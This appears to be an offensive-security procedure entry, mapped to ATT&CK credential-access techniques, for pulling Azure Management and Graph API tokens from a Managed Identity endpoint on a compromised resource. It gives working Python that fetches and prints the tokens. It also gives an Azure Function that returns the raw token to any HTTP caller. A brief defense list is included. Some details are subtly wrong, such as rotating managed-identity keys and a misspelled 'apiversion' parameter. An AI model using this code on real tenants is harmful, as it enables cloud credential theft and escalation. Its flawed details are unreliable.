---
id: 4e9675f4-b3b8-4f76-8094-61818aad47c5
name: Azure-Access-Token-Retrieval-for-Management-and-Graph-APIs-using-Python
type: procedure
verified: true
submitted: true
created_at: '2023-04-06T03:56:15.226533+00:00'
updated_at: '2023-05-24T16:06:01.998528+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
techniques:
  - '[[techniques/Cloud Service Dashboard|T1538 - Cloud Service Dashboard]]'
  - '[[techniques/Unsecured Credentials|T1552 - Unsecured Credentials]]'
sub_techniques: []
platforms:
  - Cloud
  - Web
tags:
  - '[[tags/Azure API via Python Version]]'
  - '[[tags/Cloud - Azure]]'
  - '[[tags/Python]]'
  - '[[tags/Token from Managed Identity]]'
commands: []
tools: []
validated: true
---

# Azure-Access-Token-Retrieval-for-Management-and-Graph-APIs-using-Python

## Summary

This procedure outlines how to retrieve access tokens for the Azure Management API and Microsoft Graph API using Python scripts that invoke cURL commands. It leverages Azure Managed Identities by utilizing environment variables IDENTITY_ENDPOINT and IDENTITY_HEADER to authenticate requests, enabling automated access to Azure resources without explicit credentials.

## Description

In cloud environments like Azure, Managed Identities provide a secure way to authenticate services without managing credentials. This procedure demonstrates retrieving tokens for the Management API (for resource management) and Graph API (for identity and directory operations) via Python. The script constructs cURL requests to the identity endpoint, parses the JSON responses to extract access tokens and client IDs, and prints them for use in subsequent API calls. This technique is useful in scenarios where a compromised Azure resource (e.g., a VM or Function App) with assigned Managed Identity can be abused to escalate access to broader Azure services. Prerequisites include running the script in an Azure context where the Managed Identity has the necessary roles (e.g., Reader on subscriptions for Management API).

## Requirements

1. Python 3.x installed and accessible in the execution environment.
2. cURL installed and available in the system's PATH.
3. Environment variables IDENTITY_ENDPOINT (e.g., http://169.254.169.254/metadata/identity/oauth2/token) and IDENTITY_HEADER (the secret header for the identity) set appropriately for the Managed Identity.
4. The Managed Identity must have permissions to access the target APIs (e.g., API permissions for Graph, role assignments for Management).
5. Execution in an Azure resource context (e.g., VM, App Service, Function App) where Managed Identity is enabled.

## Defense

Defensive measures and detection strategies:

- Ensure that Managed Identities are only assigned the necessary permissions to minimize blast radius.
- Regularly rotate the access keys for Managed Identities and monitor for anomalous usage patterns.
- Monitor for any unauthorized access to Azure APIs via Managed Identities, including logging token requests to the IMDS endpoint and API calls from unexpected principals.

## Objectives

1. Retrieve an access token from a Managed Identity in Azure.
2. Use the access token to authenticate with Azure APIs via Python.
3. Automate access to Azure APIs via Python scripts.

## Instructions

### Step 1: Retrieve Tokens for Management and Graph APIs

**Context**: This step imports necessary modules (assuming os and json are imported) and uses environment variables to construct and execute cURL commands for fetching tokens from the Managed Identity endpoint. It targets both the Management API and Graph API sequentially, parsing and displaying the access tokens and client IDs.

**Code** ([[codes/Python-Script-for-Azure-Managed-Identity-Token-Retrieval]]):

```python
IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
IDENTITY_HEADER = os.environ['IDENTITY_HEADER']

print("[+] Management API")
cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
val = os.popen(cmd).read()
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID/AccountID: "+json.loads(val)["client_id"])

print("\r\n[+] Graph API")
cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
val = os.popen(cmd).read()
print(json.loads(val)["access_token"])
print("ClientID/AccountID: "+json.loads(val)["client_id"])
```

> This code retrieves and prints the access tokens and client IDs for both APIs. Run it in a Python environment within Azure to obtain the tokens, which can then be used in headers for API requests (e.g., Authorization: Bearer <token>).

### Step 2: Integrate Token Retrieval in an Azure Function (Optional)

**Context**: For serverless scenarios, embed the token retrieval logic within an Azure Function to authenticate API calls dynamically. This example processes an HTTP request and returns the Management API token response.

**Code** ([[codes/Azure-Function-for-Managed-Identity-Token-Retrieval]]):

```python
import logging, os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')
    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
    cmd = 'curl "%s?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    val = os.popen(cmd).read()
    return func.HttpResponse(val, status_code=200)
```

> Deploy this as an Azure Function with Managed Identity enabled. Trigger it via HTTP to receive the raw token response. Extend it to parse and use the token for further API interactions within the function.
